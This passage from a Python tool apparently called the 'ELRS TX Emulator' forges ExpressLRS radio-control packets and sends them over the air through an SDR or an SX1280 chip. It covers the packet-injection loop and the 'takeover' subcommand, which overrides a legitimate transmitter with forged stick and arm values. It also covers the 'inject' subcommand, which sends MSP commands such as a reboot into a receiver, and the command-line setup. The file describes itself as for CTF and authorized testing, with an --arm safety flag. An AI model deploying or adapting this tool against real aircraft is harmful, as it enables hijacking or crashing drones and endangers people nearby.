        try:
            for i in range(inject_count):
                freq = self._current_freq_hz()
                self.backend.set_frequency(freq)

                if self._is_sync_slot():
                    pkt = build_sync_packet(
                        self.uid, self.nonce, self.fhss_index,
                        self.crc_init, self.crc_engine,
                        rate_enum=self.rate_enum, full_res=self.full_res)
                elif i < 3:
                    # Send MSP command in first few slots
                    pkt = build_msp_packet(
                        msp_cmd, msp_payload, self.nonce,
                        self.crc_init, self.crc_engine, full_res=self.full_res)
                elif channels_us:
                    pkt = build_rc_packet(
                        channels_us, self.nonce, self.crc_init,
                        self.crc_engine, is_armed=is_armed, full_res=self.full_res)
                else:
                    pkt = build_rc_packet(
                        [1500, 1500, 1000, 1500], self.nonce, self.crc_init,
                        self.crc_engine, is_armed=False, full_res=self.full_res)

                self.backend.transmit(pkt)
                self._advance_hop()

                next_time = time.monotonic() + self.packet_interval_s
                time.sleep(max(0, next_time - time.monotonic()))

        except KeyboardInterrupt:
            print(f"\n[*] Interrupted by user", file=sys.stderr)
        finally:
            print(f"[*] Injection complete: {inject_count} packets", file=sys.stderr)
            self.backend.stop()

    def stop(self):
        self._running = False


# ---------------------------------------------------------------------------
# Subcommands
# ---------------------------------------------------------------------------

def cmd_info(args):
    uid = phrase_to_uid(args.phrase)
    ota_version = args.ota_version
    fhss_seed = uid_to_fhss_seed(uid, ota_version)
    crc_init = uid_to_crc_init(uid, ota_version)
    fhss_seq = generate_fhss_sequence(fhss_seed)

    uid_hex = ":".join(f"{b:02X}" for b in uid)
    print(f"Binding phrase:  \"{args.phrase}\"")
    print(f"OTA version:     {ota_version}")
    print(f"UID:             {uid_hex}")
    print(f"UID bytes:       {list(uid)}")
    print(f"SYNC visible:    {uid[4]:02X}:{uid[5]:02X}  (sent in every SYNC packet)")
    print(f"FHSS seed:       0x{fhss_seed:08X}")
    print(f"CRC init:        0x{crc_init:04X}")
    print(f"Sync channel:    {ISM2G4_SYNC_CHANNEL}  ({fhss_index_to_freq_hz(ISM2G4_SYNC_CHANNEL)/1e6:.1f} MHz)")
    print(f"FHSS seq length: {len(fhss_seq)}")

    rate_us = RATE_INTERVAL_US.get(args.rate, 10000)
    print(f"Packet rate:     {1_000_000/rate_us:.0f} Hz (enum {args.rate}, {rate_us} us)")
    mode = "full-res (13B, CRC16)" if args.full_res else "standard (8B, CRC14)"
    print(f"Packet mode:     {mode}")

    print(f"\nFirst 20 FHSS hops:")
    for i in range(min(20, len(fhss_seq))):
        ch = fhss_seq[i]
        freq = fhss_index_to_freq_hz(ch)
        marker = " <-- SYNC" if ch == ISM2G4_SYNC_CHANNEL else ""
        print(f"  [{i:3d}] ch={ch:2d}  {freq/1e6:.1f} MHz{marker}")


def cmd_takeover(args):
    if not args.arm:
        print("[!] --arm flag required for TX mode (safety interlock)", file=sys.stderr)
        print("[!] This will transmit RF energy. Confirm by adding --arm.", file=sys.stderr)
        sys.exit(1)

    channels = [1500, 1500, 1000, 1500]
    if args.channels:
        parts = args.channels.split(",")
        for i, p in enumerate(parts[:4]):
            channels[i] = int(p.strip())

    if args.disarm:
        channels[2] = 1000  # throttle minimum
        is_armed = False
        print("[*] DISARM mode: throttle=1000us, armed=false", file=sys.stderr)
    else:
        is_armed = True

    backend = _create_backend(args)
    emulator = ElrsTxEmulator(
        args.phrase, backend,
        ota_version=args.ota_version,
        rate_enum=args.rate,
        full_res=args.full_res)

    def sigint_handler(sig, frame):
        emulator.stop()

    signal.signal(signal.SIGINT, sigint_handler)

    msp_cmd = getattr(args, 'msp_cmd', None)
    msp_payload = b""
    if hasattr(args, 'msp_payload') and args.msp_payload:
        msp_payload = bytes.fromhex(args.msp_payload.replace(":", "").replace(" ", ""))

    try:
        emulator.takeover(
            channels, is_armed=is_armed,
            duration_s=args.duration,
            msp_cmd=msp_cmd, msp_payload=msp_payload)
    finally:
        backend.close()


def cmd_inject(args):
    if not args.arm:
        print("[!] --arm flag required for TX mode (safety interlock)", file=sys.stderr)
        print("[!] This will transmit RF energy. Confirm by adding --arm.", file=sys.stderr)
        sys.exit(1)

    if args.msp_cmd is None:
        print("[!] --msp-cmd required for inject mode", file=sys.stderr)
        sys.exit(1)

    backend = _create_backend(args)
    emulator = ElrsTxEmulator(
        args.phrase, backend,
        ota_version=args.ota_version,
        rate_enum=args.rate,
        full_res=args.full_res)

    channels = None
    if args.channels:
        channels = [1500, 1500, 1000, 1500]
        parts = args.channels.split(",")
        for i, p in enumerate(parts[:4]):
            channels[i] = int(p.strip())

    msp_payload = b""
    if args.msp_payload:
        msp_payload = bytes.fromhex(args.msp_payload.replace(":", "").replace(" ", ""))

    try:
        emulator.inject(
            args.msp_cmd, msp_payload=msp_payload,
            channels_us=channels,
            listen_time_s=args.listen_time,
            inject_count=args.inject_count)
    finally:
        backend.close()


def _create_backend(args):
    if args.backend == "sdr":
        return SoapySDRBackend(
            device_args=args.sdr_device,
            gain=args.sdr_gain,
            antenna=args.sdr_antenna,
            bandwidth=args.sdr_bandwidth,
            rate=args.sdr_rate)
    elif args.backend == "spi":
        return SPIBackend(
            spi_device=args.spi_device,
            spi_speed_hz=args.spi_speed,
            pin_reset=args.spi_reset,
            pin_busy=args.spi_busy,
            pin_dio1=args.spi_dio1,
            tx_power=args.spi_power)
    else:
        return DryRunBackend()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="ELRS TX Emulator — transmit forged ELRS packets over the air",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For CTF research and authorized security testing only.")

    parser.add_argument("--phrase", required=True,
                        help="ELRS binding phrase")
    parser.add_argument("--ota-version", type=int, default=4, choices=[3, 4],
                        help="OTA version (3 or 4, default: 4)")
    parser.add_argument("--rate", type=int, default=4, choices=range(7),
                        help="ELRS rate enum: 0=500Hz, 1=250Hz, 2=200Hz, 3=150Hz, "
                             "4=100Hz (default), 5=50Hz, 6=25Hz")
    parser.add_argument("--full-res", action="store_true",
                        help="Use full-resolution 13-byte packets (CRC16)")
    parser.add_argument("--arm", action="store_true",
                        help="Required safety flag to enable transmission")
    parser.add_argument("--backend", choices=["sdr", "spi", "dry-run"], default="dry-run",
                        help="Radio backend (default: dry-run)")

    # SDR backend options
    sdr_group = parser.add_argument_group("SDR backend options")
    sdr_group.add_argument("--sdr-device", default="",
                           help='SoapySDR device string (e.g. "driver=uhd")')
    sdr_group.add_argument("--sdr-gain", type=float, default=60.0,
                           help="TX gain in dB (default: 60)")
    sdr_group.add_argument("--sdr-antenna", default=None,
                           help="Antenna port (e.g. 'TX/RX')")
    sdr_group.add_argument("--sdr-bandwidth", type=float, default=None,
                           help="Analog filter bandwidth in Hz")
    sdr_group.add_argument("--sdr-rate", type=float, default=2.5e6,
                           help="Sample rate in Hz (default: 2.5e6)")

    # SPI backend options
    spi_group = parser.add_argument_group("SPI backend options (direct SX1280)")
    spi_group.add_argument("--spi-device", default="/dev/spidev0.0",
                           help="SPI device path (default: /dev/spidev0.0)")
    spi_group.add_argument("--spi-speed", type=int, default=10_000_000,
                           help="SPI clock speed in Hz (default: 10 MHz)")
    spi_group.add_argument("--spi-reset", type=int, default=25,
                           help="GPIO pin for SX1280 RESET (BCM, default: 25)")
    spi_group.add_argument("--spi-busy", type=int, default=24,
                           help="GPIO pin for SX1280 BUSY (BCM, default: 24)")
    spi_group.add_argument("--spi-dio1", type=int, default=22,
                           help="GPIO pin for SX1280 DIO1 (BCM, default: 22)")
    spi_group.add_argument("--spi-power", type=int, default=13,
                           help="TX power in dBm (-18 to 13, default: 13)")

    subparsers = parser.add_subparsers(dest="command", required=True)

    # info
    subparsers.add_parser("info", help="Show derived crypto parameters (no hardware)")

    # takeover
    sp_take = subparsers.add_parser("takeover",
        help="Override the legitimate TX with our signal")
    sp_take.add_argument("--channels", type=str, default=None,
                         help="Comma-separated channel values in us (default: 1500,1500,1000,1500)")
    sp_take.add_argument("--disarm", action="store_true",
                         help="Force disarm (throttle=1000, armed=false)")
    sp_take.add_argument("--duration", type=float, default=0,
                         help="TX duration in seconds (0 = until Ctrl+C)")
    sp_take.add_argument("--msp-cmd", type=int, default=None,
                         help="Also inject this MSP command during takeover")
    sp_take.add_argument("--msp-payload", type=str, default=None,
                         help="MSP payload as hex (e.g. '01' or '01:02:03')")

    # inject
    sp_inj = subparsers.add_parser("inject",
        help="Inject commands during TX gaps")
    sp_inj.add_argument("--msp-cmd", type=int, required=True,
                        help="MSP command to inject (e.g. 68 for reboot)")
    sp_inj.add_argument("--msp-payload", type=str, default=None,
                        help="MSP payload as hex")
    sp_inj.add_argument("--channels", type=str, default=None,
                        help="RC channels to send between MSP packets (us)")
    sp_inj.add_argument("--listen-time", type=float, default=2.0,
                        help="Seconds to wait for TX gap (default: 2.0)")
    sp_inj.add_argument("--inject-count", type=int, default=10,
                        help="Number of packets to inject per burst (default: 10)")

    args = parser.parse_args()

    if args.command == "info":
        cmd_info(args)
    elif args.command == "takeover":
        cmd_takeover(args)
    elif args.command == "inject":
        cmd_inject(args)


if __name__ == "__main__":
    main()
